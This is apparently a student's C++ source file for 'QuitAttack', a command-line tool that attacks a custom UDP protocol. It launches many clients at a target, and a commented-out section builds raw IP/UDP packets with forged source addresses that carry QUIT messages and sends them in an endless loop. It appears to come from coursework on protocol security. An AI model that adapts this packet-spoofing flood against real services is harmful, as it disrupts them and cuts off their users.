//
//  main.cc
//  QuitAttack
//
//  Created by Elo Matias on 29.5.2012.
//  Copyright (c) 2012 student. All rights reserved.
//

#include <iostream>
#include <list>

#include <getopt.h>
#include <sys/stat.h>
#include <signal.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>


#include "Client.hh"
#include "Message.hh"


#define HELP "Usage: QuitAttack [-c <client port>] [-p <server port>] [-n <seq num>] [-v <version>] -t <target>"

#define MAX_CLIENT_ID 255 // Version 1
    
using namespace std;


/**
 * Interrupt handler
 */
void signalHandler(int signal);
void signalHandler(int signal){

    std::cout << "*** QuitAttack closing ***" << std::endl;
    exit(0);
}








int main (int argc, const char * argv[]){
    std::cout << "*** QuitAttack launched ***" << std::endl;
    
    //Default values
    string clientPort = "5063";
    string serverPort = "5062";
	int version = 1;
    uint32_t seqnum = 0;
    string target;
    string source;
	
    
	// Long versions of command line parameters
    static struct option long_options[] = {
		{"cport", 	required_argument, 	0, 'c'},
        {"sport", 	required_argument, 	0, 'p'},
        {"seqnum", 	required_argument, 	0, 'n'},
		{"version", required_argument, 	0, 'v'},
        {"target", required_argument, 	0, 't'},
        {"help", 	no_argument, 		0, 'h'},
        {0, 0, 0, 0}
    };
	
    int c;
    opterr = 0;
    // Use get_opt to parse command line parameters
	while ((c = getopt_long (argc, (char **)argv, "hc:p:v:n:t:", long_options, NULL)) != -1){
        switch (c)
        {
            case 'c': // Client port
                clientPort = optarg;
                cout << "Client port: " << clientPort << endl;
                break;
            case 'p': // Server port
                serverPort = optarg;
                cout << "Server port: " << serverPort << endl;
                break;
            case 'v': // Protocol version
                version = atoi(optarg);
                if ((version < 1) || (version > 2) ) {
                    version = 1;
                }
                cout << "Protocol version: " << version << endl;
                break;
            case 'n': // Sequence number
                seqnum = atoi(optarg);
                cout << "Sequence number: " << seqnum << endl;
                break;
            case 't': // Target address
                target = optarg;
                cout << "Target address: " << target << endl;
                break;
            case 'h': // Help
                cout << HELP << endl;
                break;
            case '?': // Help
                cout << HELP << endl;
                return 0;
            default:
                cout << "Default" << endl;
                return 0;
        }
    }
    
    // Check that target and source have been given
    if (target.empty()) {
        cout << "Target missing" << endl << HELP << endl;
        return 0;
    } 

    // Add SIGINT handler
    signal(SIGINT, signalHandler);
    
	
	list<string> host;
	host.push_back(target);
	
	// Start client first
	Client* clientHandler = NULL;

	for (int i = 0; i < 20; i++) {
		try {
			clientHandler = new Client(host, clientPort, serverPort, version, NULL);
			clientHandler->start();
		} catch (...) {
			cout << "Creating client handler failed." << endl;
			return 0;
		}
	}
	
	
	while(true){
        sleep(1);
    }
	/*
    // Allocate headers from memory
	char packet[2000];
    memset(packet, 0, 2000);
    struct ip* ip = (struct ip *)packet;
	struct udphdr* udp= (struct udphdr*)(packet + sizeof(struct ip));
	int sd;
	const int on = 1;
	struct sockaddr_in sin;
    
    // Create attack message
    Message msg;
    msg.init(version, TYPE_QUIT);
    msg.setSeqnum(seqnum);
    //msg.printBytes();
    
    msg.parseToBytes(packet + sizeof(struct ip) + sizeof(struct udphdr));
    int pktLen = HEADER_SIZE + msg.getPayloadLength();
    
    // Total length
    // IP header + UDP header + payload
    int totLen = sizeof(struct ip) + sizeof(struct udphdr) + pktLen;
    cout << "Total length: " << totLen << endl;
    // Fill the IP headers
    ip->ip_hl = 0x5;
	ip->ip_v = 0x4;
	ip->ip_tos = 0x0;
	ip->ip_len = totLen; // IP header + UDP header + payload
	ip->ip_id = htons(12830);
	ip->ip_off = 0x0;
	ip->ip_ttl = 64;
	ip->ip_p = IPPROTO_UDP;
	ip->ip_sum = 0x0;
	ip->ip_src.s_addr = inet_addr(source.c_str());
	ip->ip_dst.s_addr = inet_addr(target.c_str());
	ip->ip_sum = in_cksum((unsigned short *)packet, sizeof(struct ip));
    
    // Set UDP ports
    udp->uh_sport = htons(atoi(clientPort.c_str()));
    udp->uh_dport = htons(atoi(serverPort.c_str()));
    //udp.source = htons(atoi(clientPort.c_str()));
    //udp.dest = htons(atoi(serverPort.c_str()));
    
    // UDP datagram length
    udp->uh_ulen = htons(sizeof(struct udphdr) + pktLen); // UDP header + data, data still missing
    cout << "UDP len: " << ntohs(udp->uh_ulen) << endl;
    //udp.len = htons(8); // UDP header + data, data still missing
    
    // Calculate checksum
    udp->uh_sum = 0;
    //udp->uh_sum = htons(0x3251);
    //udp.check = 0;
	//udp->uh_sum = in_cksum_udp(ip->ip_src.s_addr, ip->ip_dst.s_addr, (unsigned short *)udp, (sizeof(struct ip) + sizeof(struct udphdr)));
    cout << "Source: " << ip->ip_src.s_addr << endl;
    cout << "Destination: " << ip->ip_dst.s_addr << endl;
    printf("CRC: %X", udp->uh_sum);
    
    // Create raw UDP socket
    if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("raw socket");
		exit(1);
	}
    
    // Socket options
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		perror("setsockopt");
		exit(1);
	}

	// Set destination address
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip->ip_dst.s_addr;
    
    while (true) {
        cout << "." << flush;
		
		// TODO: Rotate attack payloads (clientID & seqnum)
		
		for (int i = 0; i <= MAX_CLIENT_ID; i++) {
			msg.setClientID(i);
			msg.parseToBytes(packet + sizeof(struct ip) + sizeof(struct udphdr));
		}
		
        if (sendto(sd, packet, totLen, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)  {
            perror("sendto");
            exit(1);
        }
		
		
		
        usleep(10000);
    }
	*/
	return 0;
}
